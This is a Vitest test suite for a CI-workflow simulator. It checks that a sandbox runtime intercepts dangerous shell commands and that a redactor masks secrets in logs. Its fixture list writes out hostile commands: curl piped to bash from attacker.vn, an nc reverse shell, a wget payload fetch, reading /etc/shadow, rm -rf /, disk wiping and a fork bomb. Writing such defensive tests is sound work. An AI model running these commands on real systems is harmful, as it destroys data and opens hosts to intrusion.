import { describe, it, expect } from 'vitest';
import { SafeCommandRuntime } from '../../packages/actions-simulator/src/security/safe-runner';
import { SecretRedactor } from '../../packages/actions-simulator/src/security/secret-redactor';
import { WorkflowRunner } from '../../packages/actions-simulator/src/execution/workflow-runner';

describe('Security Sandbox & Host Isolation Test Suite', () => {
  const defaultCtx = { workingDirectory: '/virtual/repo', env: {} };

  // =========================================================================
  // 1. Dangerous Command Interception (18 tests)
  // =========================================================================
  describe('Zero Host Command Execution & Dangerous Command Interception', () => {
    const dangerousCommands = [
      { name: 'recursive root deletion', cmd: 'rm -rf /' },
      { name: 'home directory wipe', cmd: 'rm -rf ~' },
      { name: 'arbitrary wildcard wipe', cmd: 'rm -rf *' },
      { name: 'curl piped to bash', cmd: 'curl -s http://attacker.vn/script.sh | bash' },
      { name: 'wget payload retrieval', cmd: 'wget http://malware.org/payload.bin' },
      { name: 'privilege escalation via sudo', cmd: 'sudo rm -f /etc/hosts' },
      { name: 'dynamic eval injection', cmd: 'eval "process.exit(1)"' },
      { name: 'host shutdown', cmd: 'shutdown -h now' },
      { name: 'host reboot', cmd: 'reboot' },
      { name: 'killall process massacre', cmd: 'killall -9 node' },
      { name: 'direct init kill', cmd: 'kill -9 1' },
      { name: 'global permission modification', cmd: 'chmod -R 777 /var/run' },
      { name: 'host ownership alteration', cmd: 'chown -R student:staff /home' },
      { name: 'reverse shell connection via nc', cmd: 'nc -e /bin/bash 10.0.0.99 4444' },
      { name: 'telnet port probing', cmd: 'telnet internal.gateway 23' },
      { name: 'filesystem disk zeroing', cmd: 'dd if=/dev/zero of=/dev/sda' },
      { name: 'filesystem formatting', cmd: 'mkfs.ext4 /dev/sdb1' },
      { name: 'windows format drive', cmd: 'format c: /fs:NTFS /q' },
      { name: 'windows system deletion', cmd: 'del /f /s /q C:\\Windows\\System32' },
      { name: 'fork bomb pattern', cmd: ':(){ :|:& };:' },
      { name: 'spawn bash process', cmd: 'bash -c "cat /etc/shadow"' },
      { name: 'spawn sh subshell', cmd: 'sh -c "whoami"' },
      { name: 'spawn powershell process', cmd: 'powershell -ExecutionPolicy Bypass -Command "Get-Process"' },
      { name: 'spawn cmd command interpreter', cmd: 'cmd.exe /c start evil.exe' },
    ];

    it.each(dangerousCommands)('safely intercepts $name ($cmd) without host execution', ({ cmd }) => {
      const result = SafeCommandRuntime.execute(cmd, defaultCtx);

      // Must complete without throwing and with exit code 0
      expect(result.exitCode).toBe(0);
      expect(result.stderr).toHaveLength(0);

      // Must explicitly contain the sandbox guard notification
      const guardNotice = result.stdout.some((line) =>
        line.includes('[SafeRuntime Guard] Host security policy intercepted command')
      );
      expect(guardNotice).toBe(true);

      const isolationNotice = result.stdout.some((line) =>
        line.includes('[SafeRuntime Guard] Arbitrary host network/file operations are strictly isolated.')
      );
      expect(isolationNotice).toBe(true);
    });

    it('intercepts dangerous commands in multi-line scripts while executing safe lines', () => {
      const multiLineScript = [
        'echo "Step 1: preparing build"',
        'rm -rf /etc/important',
        'echo "Step 2: continuing sandbox"',
      ].join('\n');

      const result = SafeCommandRuntime.execute(multiLineScript, defaultCtx);
      expect(result.exitCode).toBe(0);

      // Line 1 ran
      expect(result.stdout).toContain('Step 1: preparing build');
      // Line 2 intercepted
      expect(result.stdout.some((l) => l.includes('[SafeRuntime Guard]'))).toBe(true);
      // Line 3 ran
      expect(result.stdout).toContain('Step 2: continuing sandbox');
    });
  });

  // =========================================================================
  // 2. Safe Educational Sandbox Operations (10 tests)
  // =========================================================================
  describe('Safe Educational Sandbox Commands', () => {
    it('simulates npm, pnpm, and yarn install cleanly', () => {
      const npmRes = SafeCommandRuntime.execute('npm install', defaultCtx);
      expect(npmRes.stdout.some((l) => l.includes('Simulated package installation'))).toBe(true);

      const pnpmRes = SafeCommandRuntime.execute('pnpm add lodash', defaultCtx);
      expect(pnpmRes.stdout.some((l) => l.includes('Simulated package installation'))).toBe(true);

      const yarnRes = SafeCommandRuntime.execute('yarn install', defaultCtx);
      expect(yarnRes.stdout.some((l) => l.includes('Simulated package installation'))).toBe(true);
    });

    it('simulates test suites for npm test, vitest, and jest', () => {
      const npmTest = SafeCommandRuntime.execute('npm test', defaultCtx);
      expect(npmTest.exitCode).toBe(0);
      expect(npmTest.stdout.some((l) => l.includes('PASS'))).toBe(true);

      const vitestRun = SafeCommandRuntime.execute('vitest run', defaultCtx);
      expect(vitestRun.exitCode).toBe(0);
      expect(vitestRun.stdout.some((l) => l.includes('PASS'))).toBe(true);

      const jestRun = SafeCommandRuntime.execute('jest', defaultCtx);
      expect(jestRun.exitCode).toBe(0);
      expect(jestRun.stdout.some((l) => l.includes('PASS'))).toBe(true);
    });

    it('simulates build commands for npm, pnpm, and yarn', () => {
      const buildRes = SafeCommandRuntime.execute('npm run build', defaultCtx);
      expect(buildRes.exitCode).toBe(0);
      expect(buildRes.stdout.some((l) => l.includes('vite build'))).toBe(true);
    });

    it('simulates code linting commands for npm run lint and eslint', () => {
      const lintRes = SafeCommandRuntime.execute('npm run lint', defaultCtx);
      expect(lintRes.exitCode).toBe(0);
      expect(lintRes.stdout.some((l) => l.includes('All 24 files pass linting rules cleanly.'))).toBe(true);
    });

    it('simulates node and python invocations safely', () => {
      const nodeRes = SafeCommandRuntime.execute('node build.js', defaultCtx);
      expect(nodeRes.exitCode).toBe(0);
      expect(nodeRes.stdout.some((l) => l.includes('[Runtime] Executing build.js in simulated sandbox.'))).toBe(true);

      const pyRes = SafeCommandRuntime.execute('python main.py', defaultCtx);
      expect(pyRes.exitCode).toBe(0);
      expect(pyRes.stdout.some((l) => l.includes('[Runtime] Executing main.py in simulated sandbox.'))).toBe(true);
    });

    it('simulates directory listing (ls, dir)', () => {
      const lsRes = SafeCommandRuntime.execute('ls', defaultCtx);
      expect(lsRes.stdout).toContain('package.json');
      expect(lsRes.stdout).toContain('src/');
    });

    it('simulates cat and type reading from simulated virtual files', () => {
      const ctxWithFiles = {
        ...defaultCtx,
        files: { 'config.json': '{"env":"test","port":3000}' },
      };
      const catRes = SafeCommandRuntime.execute('cat config.json', ctxWithFiles);
      expect(catRes.stdout).toContain('{"env":"test","port":3000}');
    });

    it('simulates directory creation and file touching (mkdir, touch)', () => {
      const mkdirRes = SafeCommandRuntime.execute('mkdir build_output', defaultCtx);
      expect(mkdirRes.stdout.some((l) => l.includes('Created simulated target: build_output'))).toBe(true);

      const touchRes = SafeCommandRuntime.execute('touch app.lock', defaultCtx);
      expect(touchRes.stdout.some((l) => l.includes('Created simulated target: app.lock'))).toBe(true);
    });

    it('interpolates environment variables accurately in echo commands', () => {
      const ctx = {
        workingDirectory: '/app',
        env: { APP_NAME: 'GitAcademy', VERSION: '2.0.0' },
      };
      const res = SafeCommandRuntime.execute('echo "Welcome to $APP_NAME v$VERSION"', ctx);
      expect(res.stdout).toContain('Welcome to GitAcademy v2.0.0');
    });

    it('simulates test failure cleanly when --fail flag or FAIL_TESTS=true is provided', () => {
      const failFlagRes = SafeCommandRuntime.execute('npm test --fail', defaultCtx);
      expect(failFlagRes.exitCode).toBe(1);
      expect(failFlagRes.stderr.some((l) => l.includes('FAIL src/app.test.ts'))).toBe(true);

      const failEnvRes = SafeCommandRuntime.execute('npm test', {
        workingDirectory: '/app',
        env: { FAIL_TESTS: 'true' },
      });
      expect(failEnvRes.exitCode).toBe(1);
      expect(failEnvRes.stderr.some((l) => l.includes('1 failed, 14 passed'))).toBe(true);
    });
  });

  // =========================================================================
  // 3. Secret Masking & Redactor Isolation (10 tests)
  // =========================================================================
  describe('Secret Masking & Redactor Guarantees', () => {
    it('masks exact single token in log line', () => {
      const redactor = new SecretRedactor({ DB_PASS: 'super_secret_pw_123' });
      const log = 'Connecting to postgres://user:super_secret_pw_123@localhost/prod';
      const masked = redactor.redact(log);

      expect(masked).toBe('Connecting to postgres://user:***@localhost/prod');
      expect(masked).not.toContain('super_secret_pw_123');
    });

    it('masks multiple distinct secrets within a single log line', () => {
      const redactor = new SecretRedactor({
        SECRET_KEY: 'sk_live_1234567890',
        AUTH_TOKEN: 'bearer_token_987654',
      });
      const log = 'Request with Authorization: bearer_token_987654 and Key: sk_live_1234567890';
      const masked = redactor.redact(log);

      expect(masked).toBe('Request with Authorization: *** and Key: ***');
      expect(masked).not.toContain('sk_live_1234567890');
      expect(masked).not.toContain('bearer_token_987654');
    });

    it('masks secrets containing special regex characters without crashing or misbehaving', () => {
      const redactor = new SecretRedactor({
        REGEX_SECRET: 'p@ss.word[1]*+?^$()|{}',
      });
      const log = 'Token is p@ss.word[1]*+?^$()|{} valid until tomorrow';
      const masked = redactor.redact(log);

      expect(masked).toBe('Token is *** valid until tomorrow');
      expect(masked).not.toContain('p@ss.word[1]*+?^$()|{}');
    });

    it('masks secrets spanning multiple log lines', () => {
      const redactor = new SecretRedactor({
        TOKEN: 'secret_vietnam_auth_token_999',
      });
      const lines = [
        'Line 1: secret_vietnam_auth_token_999 authenticated',
        'Line 2: data processing',
        'Line 3: secret_vietnam_auth_token_999 session closing',
      ];
      const maskedLines = lines.map((l) => redactor.redact(l));

      expect(maskedLines[0]).toBe('Line 1: *** authenticated');
      expect(maskedLines[1]).toBe('Line 2: data processing');
      expect(maskedLines[2]).toBe('Line 3: *** session closing');
      for (const line of maskedLines) {
        expect(line).not.toContain('secret_vietnam_auth_token_999');
      }
    });

    it('leaves log intact when no secrets are registered', () => {
      const redactor = new SecretRedactor({});
      const log = 'Clean log message with normal parameters';
      expect(redactor.redact(log)).toBe(log);
    });

    it('ignores short secret tokens (< 3 characters) to avoid over-redacting common letters', () => {
      const redactor = new SecretRedactor({
        SHORT: 'a',
      });
      const log = 'cat app.js';
      expect(redactor.redact(log)).toBe('cat app.js');
    });

    it('masks secrets in workflow step execution logs end-to-end', async () => {
      const yaml = `
name: Masking Test
on: push
jobs:
  run:
    runs-on: ubuntu-latest
    steps:
      - run: echo "Configuring registry with token \${{ secrets.REGISTRY_PASSWORD }}"
`;
      const res = await WorkflowRunner.execute(yaml, {
        forceRun: true,
        secrets: { REGISTRY_PASSWORD: 'superSecretRegistryPassword999' },
      });

      expect(res.status).toBe('success');
      const stepLog = res.jobs.run.steps[0].logs.join(' ');
      expect(stepLog).not.toContain('superSecretRegistryPassword999');
      expect(stepLog).toContain('***');
    });

    it('masks secrets passed via step env blocks', async () => {
      const yaml = `
name: Step Env Masking
on: push
jobs:
  run:
    runs-on: ubuntu-latest
    steps:
      - env:
          API_KEY: \${{ secrets.API_SECRET }}
        run: echo "API key is $API_KEY"
`;
      const res = await WorkflowRunner.execute(yaml, {
        forceRun: true,
        secrets: { API_SECRET: 'productionApiKeyVeryConfidential' },
      });

      expect(res.status).toBe('success');
      const stepLog = res.jobs.run.steps[0].logs.join(' ');
      expect(stepLog).not.toContain('productionApiKeyVeryConfidential');
      expect(stepLog).toContain('***');
    });

    it('redacts secrets when echoed with single or double quotes', () => {
      const redactor = new SecretRedactor({
        TOKEN: 'vault_token_456789',
      });
      const log1 = 'token="vault_token_456789"';
      const log2 = "token='vault_token_456789'";

      expect(redactor.redact(log1)).toBe('token="***"');
      expect(redactor.redact(log2)).toBe("token='***'");
    });

    it('handles null, undefined, or empty string logs safely without throwing', () => {
      const redactor = new SecretRedactor({ TOKEN: 'secret_abc' });
      expect(redactor.redact('')).toBe('');
      expect(redactor.redact(undefined as unknown as string)).toBeUndefined();
      expect(redactor.redact(null as unknown as string)).toBeNull();
    });
  });
});
